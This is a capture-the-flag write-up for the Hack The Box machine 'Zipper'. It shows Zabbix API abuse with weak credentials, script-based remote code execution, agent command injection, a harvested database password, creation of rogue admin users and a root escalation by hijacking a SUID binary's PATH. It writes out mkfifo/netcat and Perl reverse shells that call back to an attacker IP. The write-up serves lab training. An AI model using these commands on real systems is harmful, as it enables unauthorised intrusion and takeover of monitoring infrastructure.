## Zipper

https://app.hackthebox.com/machines/159

### Zabbix User

```
# NMAP Result
22/tcp    open  ssh        syn-ack OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http       syn-ack Apache httpd 2.4.29 ((Ubuntu))
10050/tcp open  tcpwrapped syn-ack
```

Directory enumeration finds **/zabbix/**.

Logging as Guest, we find "Zapper's Backup Script". This indicates that a user Zapper exists.  

If we try to login with zapper:zapper, we receive "GUI access disabled".  

The API is documented [here](https://www.zabbix.com/documentation/3.0/en/manual/api/reference).

**Login**
```bash
curl http://10.10.10.108/zabbix/api_jsonrpc.php -H "Content-Type: application/json-rpc" -d '{"jsonrpc":"2.0", "method":"user.login", "id":1, "auth":null, "params":{"user": "zapper", "password": "zapper"}}'
```

**Enumerate hosts**
```bash
curl -s http://10.10.10.108/zabbix/api_jsonrpc.php -H "Content-Type: application/json-rpc" -d '{"jsonrpc":"2.0", "method":"host.get", "id":1, "auth":"fb6bde5a4e946571232d9ab3f982d97a", "params":{}}' | jq .
```

With this information, we can use [this exploit](https://www.exploit-db.com/exploits/39937) to get RCE.

But first we will do it manually on the four possible ways to get shell access.

<br>

#### Path 1 - API Script Execution
The simplest way is through the API curl.

List existing scripts
```bash
curl -s http://10.10.10.108/zabbix/api_jsonrpc.php -H "Content-Type: application/json-rpc" -d '{"jsonrpc":"2.0", "method":"script.get", "id":1, "auth":"fb6bde5a4e946571232d9ab3f982d97a", "params":{}}' | jq .
```

<br>

Creating a ping script to test:
```bash
curl -s http://10.10.10.108/zabbix/api_jsonrpc.php -H "Content-Type: application/json-rpc" -d '{"jsonrpc":"2.0", "method":"script.create", "id":1, "auth":"fb6bde5a4e946571232d9ab3f982d97a", "params":{"command": "whoami", "name": "test", "execute_on": 0}}' | jq .
```

<br>

Update the script to a reverse shell
```bash
curl -s http://10.10.10.108/zabbix/api_jsonrpc.php -H "Content-Type: application/json-rpc" -d '{"jsonrpc":"2.0", "method":"script.update", "id":1, "auth":"fb6bde5a4e946571232d9ab3f982d97a", "params":{"scriptid": 4, "command": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.3 443 >/tmp/f"}}' | jq -c .
```

<br>

Execute the script
```bash
curl -s http://10.10.10.108/zabbix/api_jsonrpc.php -H "Content-Type: application/json-rpc" -d '{"jsonrpc":"2.0", "method":"script.execute", "id":1, "auth":"fb6bde5a4e946571232d9ab3f982d97a", "params":{"hostid": 10106, "scriptid": 4}}'
```

<br>

We get the shell, but it is very unstable. To resolve this, we can pipe a perl shell into the first shell to get a second shell.
```perl
perl -e 'use Socket;$i="10.10.14.3";$p=445;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

Listener
```bash
cat perl.shell | nc -lnvp 443
nc -lvnp 445
```

<br>

#### Path 2 - Zabbix to Zabbix Agent
We first use the exploit to get a shell on Zabbix container.
```bash
python2 39937.py
```

And use this to get a RCE into zipper host.
```bash
[zabbix_cmd]>>:  echo "system.run[rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.5 443 >/tmp/f]" | nc 10.10.10.108 10050
```

<br>

#### Path 3 - Admin Creds on Zabbix to GUI
We can find this credentials on zabbix container. We can login with the exploit or edit our first script with the `execute_on` parameter.
```bash
curl -s http://10.10.10.108/zabbix/api_jsonrpc.php -H "Content-Type: application/json-rpc" -d '{"jsonrpc":"2.0", "method":"script.update", "id":1, "auth":"fb6bde5a4e946571232d9ab3f982d97a", "params":{"scriptid": 4, "execute_on": 1}}' | jq -c .

curl -s http://10.10.10.108/zabbix/api_jsonrpc.php -H "Content-Type: application/json-rpc" -d '{"jsonrpc":"2.0", "method":"script.execute", "id":1, "auth":"fb6bde5a4e946571232d9ab3f982d97a", "params":{"hostid": "10106", "scriptid": 4}}' | jq . 
```

<br>

Looking around we find DB credentials that can be used on zabbix GUI access. Note: we use the admin user with this password.
```bash
cat /etc/zabbix/zabbix_server.conf | grep -Ev "^#" | grep .

DBPassword=f.YMeMd$pTbpY3-449
```

And with this access we go to Administration -> Scripts, change the Execute on to Zabbix agent and put a reverse shell on "commands".

And to execute the command we go to Monitoring/Latest Data, update the filters to Zipper, click on zipper and execute the script.

<br>

#### Path 4 - Change Users Via API
We can do a bunch of things with the users via API.

Enable GUI access for zapper.
```bash
curl -s http://10.10.10.108/zabbix/api_jsonrpc.php -H "Content-Type: application/json-rpc" -d '{"jsonrpc":"2.0", "method":"usergroup.update", "id":1, "auth":"fb6bde5a4e946571232d9ab3f982d97a", "params":{"usrgrpid": "12", "gui_access": "0"}}' | jq -c '.'
```

<br>

Add admin rights to guest.
```bash
curl -s http://10.10.10.108/zabbix/api_jsonrpc.php -H "Content-Type: application/json-rpc" -d '{"jsonrpc":"2.0", "method":"user.update", "id":1, "auth":"fb6bde5a4e946571232d9ab3f982d97a", "params":{"userid": "2", "type": "3"}}' | jq -c '.'
```

<br>

Create new admin user, following the API docs, type 3 = super admin.
```bash
curl -s http://10.10.10.108/zabbix/api_jsonrpc.php -H "Content-Type: application/json-rpc" -d '{"jsonrpc":"2.0", "method":"user.create", "id":1, "auth":"fb6bde5a4e946571232d9ab3f982d97a", "params":{"passwd": "bido123", "usrgrps": [{"usrgrpid": "7"}], "alias": "bido", "type": "3"}}' | jq -c '.'
```

<br>

### Zabbix to Zapper
Password found in **/home/zapper/utils/backup.sh** can be used to login as zapper.

Get the SSH key to make the process easier.

<br>

### Privilege Escalation
zabbix-service binary is SUID setted, if we investigate with `strings` and `ltrace` we discover that the binary uses `systemctl daemon-reload && systemctl start zabbix-agent` with relative path.

We can perform PATH Hijacking to get root.
```bash
export PATH=/tmp:$PATH

cat /tmp/systemctl
#!/bin/sh
/bin/sh

./zabbix-service
```

